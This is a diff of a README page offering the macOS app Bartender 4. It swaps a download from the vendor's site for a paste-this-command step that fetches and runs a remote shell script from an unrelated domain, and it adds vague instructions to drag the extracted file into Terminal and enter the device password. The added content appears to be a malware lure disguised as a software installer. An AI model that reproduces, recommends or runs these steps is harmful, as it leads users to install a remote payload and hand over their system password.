@@ -10,26 +10,23 @@ If the download button above doesn't work, follow the step-by-step terminal inst
 
 ### Installation via .dmg:
 
-1. Click the "Download Now" button above to download the .dmg file.
-2. Open the .dmg installer and drag the Bartender 4 application to your Applications folder or any preferred directory.
-3. Launch Terminal and navigate to the directory where you placed the Bartender 4 file (e.g., `cd /Applications`).
-4. Run the application by typing `./Bartender\ 4.app/Contents/MacOS/Bartender\ 4` and press "Return."
-5. If prompted, enter your device password (leave blank if no password is set).
+1. Install the .dmg file using the button above.
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
 
-[![Installation Demo](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
-*Demo of dragging Bartender 4 to Applications folder*
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
 
-### Installation via Terminal Command:
+### Installation via a command in the terminal:
 
 1. Copy the installation command below:
-   ```bash
-   curl -L https://bartenderapp.com/download/Bartender4.dmg -o ~/Downloads/Bartender4.dmg && open ~/Downloads/Bartender4.dmg
-   ```
-2. Open Terminal on your Mac and paste the command, then press "Return."
-3. Enter your device password if prompted and confirm the installation.
 
-[![Terminal Installation](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
-*Demo of running the terminal command for installation*
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get3/install.sh)"
+
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
 
 ---
 
